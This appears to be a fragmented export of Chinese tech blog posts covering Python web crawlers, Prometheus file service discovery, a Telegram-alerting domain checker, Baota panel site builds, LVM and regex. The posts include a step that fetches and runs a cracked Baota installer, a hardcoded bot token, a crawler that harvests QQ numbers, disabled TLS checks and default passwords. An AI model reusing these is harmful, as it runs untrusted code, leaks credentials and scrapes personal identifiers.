1,get请求12345678910111213141516#GET请求'''特点：把数据拼接到请求路径的后面传递给服务器优点： 速度快缺点： 承载的数据量少，不安全'''import urllib.requesturl =&quot;https://yichenxiu.com/html/wenzi/&quot;response = urllib.request.urlopen(url)data = response.read().decode(&quot;utf-8&quot;)print(data)print(type(data)) 2,json数据解析1234567891011121314151617181920212223242526272829303132333435363738394041424344454647'''概念：一种保存数据的格式作用：可以保存本地的json文件，也可以将json串进行传输，通常将json称为轻量级的传输方式。json文件的组成{} 代表对象(字典)[] 代表列表: 代表键值对, 分隔两个部分'''import jsonjsonStr = '''{&quot;name&quot;:&quot;yichen秀&quot;,&quot;age&quot;:18,&quot;hobby&quot;:[&quot;money&quot;,&quot;power&quot;,&quot;english&quot;],&quot;parames&quot;:{&quot;a&quot;:1,&quot;b&quot;:2}}'''#将json格式的字符串转为python数据类型的对象jsonData = json.loads(jsonStr)print(jsonData)print(type(jsonData))print(jsonData[&quot;hobby&quot;])#将python格式的字符串转为json数据类型的对象jsonData2 = '''{&quot;name&quot;:&quot;yichen秀&quot;,&quot;age&quot;:18,&quot;hobby&quot;:[&quot;money&quot;,&quot;power&quot;,&quot;english&quot;],&quot;parames&quot;:{&quot;a&quot;:1,&quot;b&quot;:2}}'''jsonStr2 = json.dumps(jsonData2)print(jsonStr2)print(type(jsonStr2))#读取本地的json文件path1 = r&quot;D:\\py_work\\grep\\爬虫\\file\\config.json&quot;with open(path1,&quot;rb&quot;) as f: data = json.load(f) print(data) #字典类型 print(type(data))#写本地的json文件path2 = r&quot;D:\\py_work\\grep\\爬虫\\file\\config.json&quot;jsonData3 = '''{&quot;name&quot;:&quot;yichen秀&quot;,&quot;age&quot;:18,&quot;hobby&quot;:[&quot;money&quot;,&quot;power&quot;,&quot;english&quot;],&quot;parames&quot;:{&quot;a&quot;:1,&quot;b&quot;:2}}'''with open(path2, &quot;w&quot;) as f : json.dump(jsonData3,f) 3, POST请求1234567891011121314151617181920212223242526272829303132333435363738394041424344#POST请求'''特点: 把参数进行打包，单独传输优点:数量大，安全(当对服务器数据进行修改时建议使用post)缺点: 速度慢'''import urllib.requestimport urllib.parseurl =&quot;https://yichenxiu.com/look/login.php?referer=https%3A%2F%2Fyichenxiu.com%2Flook%2Fwelcome.php&quot;#将要发送的数据合成一个字典#字典的键去网址里找，一般为input标签的name属性的值data = { &quot;name&quot;:&quot;yichen&quot;, &quot;password&quot;:&quot;****!&quot;}#对要发送的数据进行打包postData = urllib.parse.urlencode(data).encode(&quot;utf-8&quot;)header = { &quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;, &quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;,}#请求体req =urllib.request.Request(url, data=postData,headers=header)#req.add_header(&quot;User-Agent&quot;, &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36&quot;)#请求response = urllib.request.urlopen(req)data1 = response.read().decode(&quot;utf-8&quot;)print(data1)#把文件保存with open(r&quot;D:\\py_work\\grep\\爬虫\\file\\file2.html&quot; ,&quot;w&quot;,encoding=&quot;utf-8&quot;) as f: f.write(data1) 5，抓取网页动态Ajax请求的数据1234567891011121314151617181920212223242526272829303132333435import urllib.requestimport sslimport json,timedef ajaxCrawler(url): headers ={ &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;, } req = urllib.request.Request(url,headers = headers) context = ssl._create_unverified_context() #使用ssl创建未验证的上下文 response = urllib.request.urlopen(req,context=context) jsonStr = response.read().decode(&quot;utf-8&quot;) jsonData = json.loads(jsonStr) return jsonData'''url= &quot;https://movie.douban.com/j/chart/top_list?type=17&amp;interval_id=100%3A90&amp;action=&amp;start=40&amp;limit=20&quot;info = ajaxCrawler(url)print(info)'''for i in range(1,11): url =&quot;https://movie.douban.com/j/chart/top_list?type=17&amp;interval_id=100%3A90&amp;action=&amp;start=&quot;+ str(i*20)+&quot;&amp;limit=20&quot; info = ajaxCrawler(url) print(len(info)) #print(info) time.sleep(1) with open(r&quot;D:\\py_work\\grep\\爬虫\\file\\file3.html&quot;, &quot;a&quot;,encoding=&quot;utf-8&quot; ) as f: f.write(str(info)) 6,糗事百科爬虫12345678910111213141516171819202122232425262728293031323334353637383940414243444546import urllib.requestimport redef jokeCrawler(url): headers ={ &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot;, } req = urllib.request.Request(url,headers = headers) response = urllib.request.urlopen(req) Html = response.read().decode(&quot;utf-8&quot;) #Html = str(response.read()) #print(Html) #正则匹配 pat =r'&lt;div class=&quot;author clearfix&quot;&gt;(.*?)&lt;span class=&quot;stats-vote&quot;&gt;&lt;i class=&quot;number&quot;&gt;' divsList = re.findall(pat,Html,re.S) #print(divsList) #print(len(divsList)) dic = {} for div in divsList: #用户名 re_u = re.compile(r&quot;&lt;h2&gt;(.*?)&lt;/h2&gt;&quot;,re.S) username =re_u.findall(div) #print(username[0]) username = username[0] #print(type(username)) #段子 re_d = re.compile(r'&lt;div class=&quot;content&quot;&gt;\\n&lt;span&gt;(.*?)&lt;/span&gt;', re.S) duanzi = re_d.findall(div) #print(duanzi[0]) dic[username] = duanzi return dicurl = r&quot;https://www.qiushibaike.com/text/page/2/&quot;info = jokeCrawler(url)print(info)for k,v in info.items(): print(k + &quot;说\\n&quot;,v)with open(r&quot;D:\\py_work\\grep\\爬虫\\file\\file5.html&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f: f.write(str(info)) 7,爬图片练习123456789101112131415161718192021222324252627282930313233343536import urllib.request,re,osdef imageCrawler(url,toPath): headers = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot; } req = urllib.request.Request(url, headers=headers) response = urllib.request.urlopen(req) HtmlStr = response.read().decode(&quot;utf-8&quot;) # with open(r&quot;D:\\py_work\\grep\\爬虫\\file\\image\\yhd.html&quot;, &quot;wb&quot;) as f: # f.write(HtmlStr) pat = r'&lt;img src=(.*?) alt=&quot;&quot;' re_image = re.compile(pat) imageList = re_image.findall(HtmlStr) print(imageList) print(len(imageList)) num = 1 for imageUrl in imageList: path = os.path.join(toPath, str(num)+&quot;.jpg&quot;) num += 1 # 把图片下载到本地存储 urllib.request.urlretrieve(&quot;http://&quot;+imageUrl,filename=path)url = r&quot;https://qianggou.yhd.com/ajax/ajaxActivityProduct.do?pageNo=1&amp;siteType=&amp;provinceId=2&amp;grouponId=558169034&amp;_=1590000642329&quot;toPath = r&quot;D:\\py_work\\grep\\爬虫\\file\\image&quot;imageCrawler(url,toPath) 8，爬取网络中的QQ号1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980import urllib.requestimport sslimport osimport refrom collections import dequedef writeFileByte(htmlBytes,toPath): with open(toPath,&quot;wb&quot;) as f: f.write(htmlBytes)def writeFileStr(htmlBytes,toPath): with open(toPath,&quot;w&quot;) as f: f.write(str(htmlBytes))def getHtmlBytes(url): headers = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36&quot; } # 请求头 req = urllib.request.Request(url, headers=headers) context=ssl._create_unverified_context() # 请求体 response = urllib.request.urlopen(req,context=context) return response.read()#爬取网页信息+文件存储目录文件def qqCrawler(url,toPath): htmlBytes=getHtmlBytes(url) writeFileByte(htmlBytes,r&quot;D:\\py_work\\grep\\爬虫\\file\\image\\file1.html&quot;) writeFileStr(htmlBytes,r&quot;D:\\py_work\\grep\\爬虫\\file\\image\\file2.txt&quot;) htmlStr=str(htmlBytes)#找qq号 #pat=r'&lt;/li&gt;\\n&lt;li class=&quot;d_name&quot; data-field=(.*?)}' pat=r&quot;[1-9]\\d{4,9}&quot; re_qq=re.compile(pat) qqList=re_qq.findall(htmlStr) #去重复 qqList=list(set(qqList)) f=open(toPath,&quot;a&quot;) for qqStr in qqList: f.write(qqStr+&quot;\\n&quot;) f.close() #找网址 pat1=r'(((http|ftp|https?)://)(([a-zA-Z0-9\\._-]+\\.[a-zA-Z]{2,6})|([0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}))(:[0-9]{1,4})*(/[a-zA-Z0-9\\&amp;%_\\./-~-]*)?)' re_url=re.compile(pat1) urlsList=re_url.findall(htmlStr) #去重 urlsList=list(set(urlsList)) return urlsListdef center(url,toPath): queue=deque() queue.append(url) while len(queue)!=0: targetUrl=queue.popleft() urlList=qqCrawler(targetUrl,toPath) for item in urlList: tempUrl=item[0] queue.append(tempUrl)#爬取地址url =&quot;https://tieba.baidu.com/p/2&quot;#QQ存储目录文件toPath = r&quot;D:\\py_work\\grep\\爬虫\\file\\image\\qqFile.txt&quot;center(url,toPath)","link":"/2020/08/04/%E7%88%AC%E8%99%AB/"},{"title":"Prometheus服务发现","text":"一、环境 主机名 IP地址 系统 说明 localhost 192.168.224.11 Centos7.6 docker安装的prometheus server2.com 192.168.224.12 Centos7.6 已经完成了rabbitmq，mysql，redis，nginx等基于配置文件的监控 二、服务发现接下来我们将学习 Prometheus 中是如何使用服务发现来查找和抓取目标的。我们知道在 Prometheus 配置文件中可以通过一个 static_configs 来配置静态的抓取任务，但是在云环境下，特别是容器环境下，抓取目标地址是经常变动的，所以用静态的方式就不能满足这些场景了，还有特别在很多服务器需要监控时。所以我们需要监控系统能够动态感知这个变化，不可能每次变动都去手动重新配置的，为了应对复杂的动态环境，Prometheus 也提供了与基础设施中的服务发现集成的功能。 Prometheus 已经支持多种内置的服务发现机制： 发现云服务商的 VM 虚拟机 Kubernetes 上的自动发现 通用的服务查找，例如 DNS、Consul、Zookeeper 或自定义发现机制 我们都可以通过 Prometheus 配置文件中的 scrape_config 部分进行配置，Prometheus 会不断更新动态的抓取目标列表，自动停止抓取旧的实例，开始抓取新的实例，Prometheus 特别适合运行于 Kubernetes 集群下面，可以自动发现监控目标。 此外大部分服务发现机制还会提供目标的一些元数据，通常都是带有 __ 的前缀， 比如标签、注解、服务名等等，可以在 relabeling 阶段使用这些元数据来过滤修改目标，这些元信息标签在重新标记阶段后被删除。 三、基于文件的服务发现除了基于 Consul 的服务发现之外，Prometheus 也允许我们进行自定义的发现集成，可以通过 watch 一组本地文件来获取抓取目标以及标签信息，也就是我们常说的基于文件的服务发现方式。 基于文件的服务发现提供了一种更通用的方式来配置静态目标，并作为一个接口插入自定义服务发现机制。 它读取一组包含零个或多个 &lt;static_config&gt; 列表的文件，对所有定义的文件的变更通过磁盘监视被检测到并立即应用，文件可以以 YAML 或 JSON 格式提供。文件必须包含一个静态配置的列表: 当然该文件也可以使用 JSON 格式进行配置： 123456789[ { &quot;targets&quot;: [ &quot;&lt;host&gt;&quot;, ... ], &quot;labels&quot;: { &quot;&lt;labelname&gt;&quot;: &quot;&lt;labelvalue&gt;&quot;, ... } }, ...] 如果是 YAML 文件则格式为： 1234- targets: [ - '&lt;host&gt;' ] labels: [ &lt;labelname&gt;: &lt;labelvalue&gt; ... ] 文件内容也会在指定的刷新间隔时间内定期重新读取。 123456# Patterns for files from which target groups are extracted.files: [ - &lt;filename_pattern&gt; ... ]# Refresh interval to re-read the files.[ refresh_interval: &lt;duration&gt; | default = 5m ] 其中 &lt;filename*pattern&gt; 可以是一个以 .json、.yml 或 .yaml 结尾的路径，最后一个路径段可以包含一个匹配任何字符序列的 *，例如：my/path/tg_*.json。 1、创建文件接下来我们来创建一个用于服务发现的目标文件，在与 prometheus.yml 文件相同目录下面创建一个名为 targets.yml 的文件，内容如下所示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748cd /data/docker-prometheusmkdir prometheus/targetscat &gt; prometheus/targets/targets.yml&lt;&lt;&quot;EOF&quot;- targets: ['localhost:9090'] labels: job: prometheus- targets: ['cadvisor:8080'] labels: instance: Prometheus服务器 job: cadvisor- targets: ['192.168.224.12:8080'] labels: instance: server2.com服务器 job: cadvisor- targets: ['node_exporter:9100'] labels: instance: Prometheus服务器 job: node-exporter- targets: ['192.168.224.12:9100'] labels: instance: server2.com服务器 job: node-exporter- targets: ['192.168.224.12:9113'] labels: instance: server2.com服务器 job: nginx_exporter- targets: ['192.168.224.12:9121'] labels: instance: server2.com服务器 job: redis_exporter- targets: ['192.168.224.12:9419'] labels: instance: server2.com服务器 job: rabitmq_exporter- targets: ['192.168.224.12:9216'] labels: instance: server2.com服务器 job: mongodb_exporter- targets: ['192.168.224.12:9104'] labels: instance: server2.com服务器 job: mysqld_exporter- targets: ['192.168.224.12:9256'] labels: instance: server2.com服务器 job: process EOF springboot.yml 1234cat &gt;prometheus/targets/springboot.yml&lt;&lt;&quot;EOF&quot;- targets: - 192.168.224.12:8081EOF blackbox-exporter-http.yml 12345cat &gt;prometheus/targets/blackbox-exporter-http.yml&lt;&lt;&quot;EOF&quot;- targets: - https://www.baidu.com - https://www.jd.comEOF blackbox-exporter-tcp.yml 12345cat &gt;prometheus/targets/blackbox-exporter-tcp.yml&lt;&lt;&quot;EOF&quot;- targets: - 192.168.224.11:22 - 192.168.224.11:9090EOF blackbox-exporter-icmp.yml 12345cat &gt;prometheus/targets/blackbox-exporter-icmp.yml&lt;&lt;&quot;EOF&quot;- targets: - 192.168.224.11 - 192.168.224.12EOF domain.yml 12345cat &gt;prometheus/targets/domain.yml&lt;&lt;&quot;EOF&quot;- targets: - qq.com - baidu.comEOF 2、配置文件服务发现用于发现的目标文件创建完成后，要让 Prometheus 能够从上面的 targets.yml 文件中自动读取抓取目标，需要在 prometheus.yml 配置文件中的 scrape_configs 部分添加如下所示的抓取配置： 备份文件 123cp -a prometheus/prometheus.yml{,.bak}ls -l prometheus/prometheus.yml.bak 使用cat新建文件 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697cat &gt;prometheus/prometheus.yml&lt;&lt;&quot;EOF&quot;# 全局配置global: scrape_interval: 15s # 将搜刮间隔设置为每15秒一次。默认是每1分钟一次。 evaluation_interval: 15s # 每15秒评估一次规则。默认是每1分钟一次。# Alertmanager 配置alerting: alertmanagers: - static_configs: - targets: ['alertmanager:9093']# 报警(触发器)配置rule_files: - &quot;alert.yml&quot; - &quot;rules/*.yml&quot;# 搜刮配置scrape_configs: - job_name: &quot;file-sd-test&quot; file_sd_configs: - refresh_interval: 10s files: - &quot;targets/targets.yml&quot;# Spring Boot 2.x 应用数据采集配置 - job_name: 'file-springboot-demo' metrics_path: '/actuator/prometheus' file_sd_configs: - refresh_interval: 10s files: - targets/springboot.yml#http配置 - job_name: &quot;file-blackbox_http&quot; metrics_path: /probe params: module: [http_2xx] file_sd_configs: - refresh_interval: 10s files: - targets/blackbox-exporter-http.yml relabel_configs: - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 192.168.224.12:9115#tcp检查配置 - job_name: &quot;file-blackbox_tcp&quot; metrics_path: /probe params: module: [tcp_connect] file_sd_configs: - refresh_interval: 10s files: - targets/blackbox-exporter-tcp.yml relabel_configs: - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 192.168.224.12:9115#icmp检查配置 ping - job_name: &quot;blackbox_icmp&quot; metrics_path: /probe params: module: [icmp] file_sd_configs: - refresh_interval: 10s files: - targets/blackbox-exporter-http.yml relabel_configs: - source_labels: [__address__] target_label: __param_target - source_labels: [__param_target] target_label: instance - target_label: __address__ replacement: 192.168.224.12:9115 - job_name: domain #scrape_interval: 1h scrape_interval: 15s metrics_path: /probe relabel_configs: - source_labels: [__address__] target_label: __param_target - target_label: __address__ replacement: 192.168.224.12:9222 # domain_exporter address file_sd_configs: - refresh_interval: 10s files: - targets/domain.ymlEOF 重载 1curl -X POST http://localhost:9090/-/reload 重新 reload 或者重启下 Prometheus 让其重新读取配置文件信息，然后同样前往 Prometheus UI 的 targets 页面下面查看 然后我们可以尝试改变 targets.yml 的内容，比如为192.168.224.12:8080实例增加一个 env: test的标签，不用重新加载 Prometheus 配置，Prometheus 将 watch 该文件，并自动接收任何变化。 注意：当在生产环境 Prometheus 服务器中改变 file_sd 目标文件时，确保改变是原子的，以避免重新加载出现错误，最好的方法是在一个单独的位置创建更新的文件，然后将其重命名为目标文件名（使用 mv 命令或 rename() 系统调用）。 这样我们就完成了基于文件的通用服务发现机制，可以让我们动态地改变 Prometheus 的监控目标，而不需要重新启动或重新加载 Prometheus 服务。","link":"/2023/05/09/%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0&%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0/"},{"title":"简单的域名检测脚本","text":"简单的域名检测脚本， 通过利用网站工具检测 1，check-domain.sh 脚本内容 123456789101112131415161718192021222324252627282930313233#!/bin/bashscript_dir=$( cd $(dirname &quot;$0&quot;) &amp;&amp; pwd ) echo &quot;`date +&quot;%Y-%m-%d-%R&quot;`&quot; &gt;$script_dir/domain.txt echo &quot;`date +&quot;%Y-%m-%d-%R&quot;`&quot; &gt;$script_dir/有问题.txtcat ${script_dir}/domain_ssl.info |while read line;do code=`curl https://tool.chinaz.com/pagestatus/?url=https%3A%2F%2F${line}| egrep -o '(&lt;span&gt;[0-9]{1,4}&lt;/span&gt;)'|egrep -o '([0-9]{1,4})'` if [ $code -ne 200 ] &amp;&amp; [ $code -ne 301 ] &amp;&amp; [ $code -ne 302 ];then echo &quot;可能有问题的域名是 ${line} 状态码是: ${code}&quot; &gt;&gt;${script_dir}/有问题.txt;fi echo &quot;检测的域名是 ${line} 状态码是: ${code}&quot; &gt;&gt;${script_dir}/domain.txtdonecat ${script_dir}/domain.txt | egrep -v '状态码是: [0-9]{3,4}' &gt;&gt; ${script_dir}/等待二次过滤.txtcat ${script_dir}/等待二次过滤.txt|awk '{print $2}' |while read line1;do code1=`curl https://tool.chinaz.com/pagestatus/?url=https%3A%2F%2F${line1}| egrep -o '(&lt;span&gt;[0-9]{1,4}&lt;/span&gt;)'|egrep -o '([0-9]{1,4})'` if [ $code1 -ne 200 ] &amp;&amp; [ $code1 -ne 301 ] &amp;&amp; [ $code1 -ne 302 ];then echo &quot;可能有问题的域名是 ${line1} 状态码是: ${code1}&quot; &gt;&gt;${script_dir}/有问题.txt;fi echo &quot;检测的域名是 ${line1} 状态码是: ${code1}&quot; &gt;&gt;${script_dir}/domain1.txtdonecat ${script_dir}/domain1.txt | egrep -v '状态码是: [0-9]{3,4}' &gt;&gt; ${script_dir}/有问题.txtsh ${script_dir}/message.sh 2,发送信息给telegram机器人的脚本 message.sh内容为 123456789#!/bin/bashscript_dir=$( cd $(dirname &quot;$0&quot;) &amp;&amp; pwd)curl -X POST &quot;https://api.telegram.org/bot709759784:AAF2Tff_lKOBLIXHPzfoM1WHQkXt-SqkAqo/sendMessage&quot; -d &quot;chat_id=-377237859&amp;text=`cat ${script_dir}/有问题.txt`&quot;rm -rf ${script_dir}/有问题.txtrm -rf ${script_dir}/domain.txtrm -rf ${script_dir}/等待二次过滤.txtrm -rf ${script_dir}/domain1.txt 3, 新建domain_ssl.info 文件，里面保存要检测的域名， 4，设置定时任务，每隔40分检测一次 12*/40 * * * * sh /check-domain/check-domain.sh","link":"/2020/08/04/%E7%AE%80%E5%8D%95%E7%9A%84%E5%9F%9F%E5%90%8D%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC1.0/"},{"title":"用宝塔搭建源码服务","text":"一， 一键安装宝塔环境安装宝塔 开启端口 (8888|888|80|443|20|21)。 1、登录服务器 输入代码 然后按回车下一步 12目前需要注册宝塔账号yum install -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh 1.1 下面的是破解版免宝塔账号登录的 123官方下载网址https://www.hostcli.com/yum install -y wget &amp;&amp; wget -O install.sh http://v7.hostcli.com/install/install_6.0.sh &amp;&amp; sh install.sh 2、您想现在安装bt面板到www目录吗？ 输入y 然后按回车下一步 安装过程15分钟左右，速度快5分钟 3、安装宝塔完毕，服务器会提示宝塔面板的管理登录地址，账号密码（用电脑的浏览器访问登录），安装好宝塔后先把安装好的firewalld 停掉，然后安装iptables, Bt-Panel: http://172.17.46.14:8888/adminsh username: lukepassword: 123.luke 使用 /etc/init.d/bt default 查看宝塔登陆信息 1234567891011121314systemctl disable firewalldsystemctl stop firewalldyum install -y iptables iptables-servicessystemctl enable iptablessystemctl restart iptablesiptables -A INPUT -p tcp -m multiport --dports 8888,888,80,3306,443,21,20 -j ACCEPT iptables -A INPUT -p tcp -m multiport --sports 8888,888,80,3306,443,21,20 -j ACCEPT 4，必装环境：nginx(apache.iis也可)，mysql, lnmp架构 新建站点，注意新建时，PHP版本必须选择PHP5.6，不然程序会报错 在这里做个快照 二，搭建源码项目1，搭建小说网在宝塔基础环境上 安装 ,php5.6,memcached php5.6安装扩展memcache新建站点，注意新建时，PHP版本必须选择PHP5.6，不然程序会报错 添加网站，过程如果报错，就修改nginx相关配置文件 数据库账号资料 数据库名：luke 用户：luke 密码：123.luke 1.上传网站文件到网站目录，新建网站伪静态选择thinkphp 2.新建数据库。导入数据库文件ptcms.sql 3.修改数据库信息/application/common/config.php /www/wwwroot/luke/application/common/config.php 注意：如果伪静态正常网站还出现404，打开根目录index.php 在倒数第二行添加： define(‘APP_DEBUG’,true);网站正常后删除 4.登录网站后台：www.xx.com/admin 用户名：admin 密码： admin123 5.”系统” - “基本设置” - “数据库” - 把第三步再设置一遍 6.”系统” - “基本设置” - 修改为自己的既可 7.”扩展” - “任务管理” - “任务管理” - “全选” - “恢复” -开启自动采集 8.”扩展” - “模块管理” - “网站地图” - 修改为自己的既可 9.”扩展” - “模块管理” - “手机地图” - 修改为自己的既可 10.”用户” - 管理员密码修改 http://172.17.46.14 访问 2，搭建超级签证书1,安装环境 linux php7.1删除php禁用函数里面的exce 2,添加网站，连接数据库 开启SSL和伪静态 123456789101112location / { if (!-e $request_filename){ rewrite &quot;^/([a-zA-Z0-9]{6})$&quot; /user/install/index/$1/ last; rewrite ^(.*)$ /index.php?s=$1 last; break; }} 3，把相关文件上传到家目录 把权限改成www 网站目录public 关闭防跨站 4，修改数据库data/conf/database.php /www/wwwroot/luke/data/conf/database.php 5,导入数据库.sql文件 http://172.17.46.14/ admin 后台/admin 帐号admin 密码123456 3,搭建视频网站源码基础环境也是宝塔lnmp架构 添加网站，填写相关信息 将文件夹下所有的文件上传至您的网站空间修改权限 chown www:www luke/ -R 如果您的主机为 window 操作系统，请将以下文件夹的IIS用户加上写入权限 如果您的主机为 linux 操作系统，请设置如下文件夹权限为 777 ./Runtime/* 系统缓存目录 ./Uploads/* 系统附件保存目录 通过浏览器访问 http://您的域名/install.php,根据提示填写 mysql 配置信息 完成安装后会自动跳转到后台，默认用户名是admin 密码是admin888 后台路径为http://您的域名/admin.php(强列建议将admin.php改一个不容易猜到的名字) 进入后台后默认是没有视频的，需要采集视频 4,搭建图床源码基础环境也是宝塔lnmp架构 php需要安装fileinfo拓展 添加网站，填写相关信息 将文件夹下所有的文件上传至您的网站空间修改权限 chown www:www luke/ -R 设置运行目录为 public。 关闭防跨站 新建网站伪静态选择thinkphp 或者自己改为下面的规则 12345location / { if (!-e $request_filename) { rewrite ^(.*)$ /index.php?s=$1 last; break; } } 2, 直接登录网站填写相关数据库信息 然后就可以上传图片了，","link":"/2020/08/05/%E7%94%A8%E5%AE%9D%E5%A1%94%E6%90%AD%E5%BB%BA%E6%BA%90%E7%A0%81%E6%9C%8D%E5%8A%A1/"},{"title":"磁盘命令lvm","text":"PV:物理卷VG:卷组LV:逻辑卷 一、物理卷管理命令1.pvcreate /dev/hdb1 建立物理卷2.pvscan(pvs) 查看所有物理卷信息，也可指定3.pvdisplay /dev/hdb1 显示指定物理卷的信息4.pvchange 移除物理卷5.pvmove 移除物理卷 二、卷组管理命令1.vgscan(vgs) 查看所有的逻辑卷，也可指定2.vgcreate myvg /dev/hdb1 建立卷组3.vgextend myvg /dev/hdb2 往卷组中添加新的物理卷4.vgcfgbackup 备份卷组中各物理卷的VGDA信息到/etc/vmconf目录的文件中5.vgcfgrestore 从文件中恢复卷组中物理卷的VGDA6.vgchange 改变卷组属性7.vgck 检测卷组中VGDA的一致性8.vgdisplay 显示卷组信息9.vgexport 输出卷组使系统不能识别该卷组10.vgimport 与vgexport相反11.vgmerge 合并两个已存在的卷组12.vgmknodes 重新建立已有卷组的卷组目录和其中的设备文件13.vgreduce 把卷组中未使用的物理卷移出卷组14.vgremove 删除空的(不包含逻辑卷)卷组15.vgrename 重命名非活动的卷组（未挂载使用的）16.vgsplit 把一个卷组拆分为两个 三、逻辑卷管理命令1.lvscan(lvs) 查看所有逻辑卷，也可指定2.lvcreate –L 2G –n mylv1 myvg 新建逻辑卷（-L 指定实际大小，-l 指定百分比大小）3.lvextend –L +100M /dev/myvg/mylv1 扩充逻辑卷mylv1的容量,增加100M4.lvreduce -L -100M /dev/myvg/mylv1 缩小逻辑卷mylv1的容量,缩小100M5.resize2fs /dev/myvg/mylv1 调整ext3文件系统的容量（已经挂载使用的逻辑卷）6.e2fsadm 调整未挂载的逻辑卷容量7.lvremove 删除非活动的逻辑卷（未挂载使用的）8.resize_reiserfs 调整reiserfs文件系统的容量9.lvchange 改变逻辑卷的属性10.lvdisplay 显示逻辑卷的属性11.lvrename 对非活动的逻辑卷改名12.lvmchange 在紧急情况下用于复位逻辑卷管理器13.lvmdiskscan 检测硬盘和分区中的逻辑卷管理信息14.lvmsade 收集逻辑卷的读写统计数据15.lvmsar 报告lvmsade命令收集的逻辑卷的读写统计数据","link":"/2020/08/03/%E7%A3%81%E7%9B%98%E5%91%BD%E4%BB%A4lvm/"},{"title":"python3正则表达式","text":"1,判断手机号 123456789101112131415161718192021222324252627import re'''给你一串字符串，判断是否是手机号'''#普通的方法def chekPhone(str): if len(str) !=11: return False elif str[0] != &quot;1&quot;: return False elif str[1:2] !=&quot;3&quot; and str[1:2] !=&quot;8&quot; and str[1:2] !=&quot;7&quot;: return False for i in range(3,11): if str[i] &lt;&quot;0&quot; or str[i]&gt; &quot;9&quot;: return False return Trueprint(chekPhone(&quot;17312584561&quot;))print(chekPhone(&quot;139125845f61&quot;))print(chekPhone(&quot;1391258g456&quot;))print(chekPhone(&quot;13912f84561&quot;)) 2,正则概述和re模块简介12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import re'''python自1.5以后增加了re的模块。提供了正则表达式模式re模块使python语言拥有了全部的正则表达式功能'''#re模块简介r'''re.match函数原型: match(pattern, string, flags = 0)patter: 匹配的正则表达式string: 要匹配的字符串flags: 标志位，用于控制正则表达式的匹配方式 值如下：re.I 忽略大小写re.L 做本地化识别re.M 多行匹配，影响^和$re.S 是匹配包括换行符在内的所有字符 re.U 根据Unicode字符集解析字符，\\w \\W \\b \\Bre.X 使我们以更灵活的格式理解正则表达式参数：功能：尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，返回None'''#www.baidu.comprint(re.match(&quot;www&quot;,&quot;www.baidu.com&quot;).span())print(re.match(&quot;www&quot;,&quot;ww.baidu.com&quot;))print(re.match(&quot;www&quot;,&quot;baidu.www.com&quot;))print(re.match(&quot;www&quot;,&quot;wwW.baidu.com&quot;))print(re.match(&quot;www&quot;,&quot;www.baidu.com&quot; ,flags=re.I))#扫描整个字符串，返回从起始位置成功的匹配print(&quot;------------------&quot;)'''re.search函数原型: search(pattern, string, flags = 0)patter: 匹配的正则表达式string: 要匹配的字符串flags: 标志位，用于控制正则表达式的匹配方式 功能: 扫描整个字符串，并返回第一个成功的匹配'''print(re.search(&quot;yichen&quot;,&quot;good man is yichen! yichen is nice &quot;))print(&quot;------------&quot;)'''re.findall函数原型: findall(pattern, string, flags = 0)patter: 匹配的正则表达式string: 要匹配的字符串flags: 标志位，用于控制正则表达式的匹配方式 功能: 扫描整个字符串，并返回结果列表'''print(re.findall(&quot;yichen&quot;,&quot;good man is yichen! Yichen is nice &quot;))print(re.findall(&quot;yichen&quot;,&quot;good man is yichen! Yichen is nice &quot;,flags=re.I)) 3，正则表达式的元字符123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596import reprint(&quot;---------匹配单个字符与数字-----------&quot;)r'''. 匹配除换行符以外的任意字符[0-9] []是字符集合，表示匹配方括号中所包含的任意一个字符[yichen] 匹配'y','i','c','h','e','n'中的任意一个字符[a-z] 匹配任意一个小写字母[A-Z] 匹配任意一个大写字母[0-9a-zA-Z] 匹配任意一个的数字和字母[0-9a-zA-Z_] 匹配任意一个的数字、字母和下划线[^yichen] 匹配除了yichen这几个字母以外的所有字符，中括号里的^称为托字符，表示不匹配集合中的字符[^0-9] 匹配所有的非数字字符\\d 匹配所有的数字，效果同[0-9][^\\d] 匹配所有的非数字字符，效果同[^0-9]\\D 匹配非数字字符，效果同[^0-9]\\w 匹配数字，字母和下划线，效果同[0-9a-zA-Z_]\\W 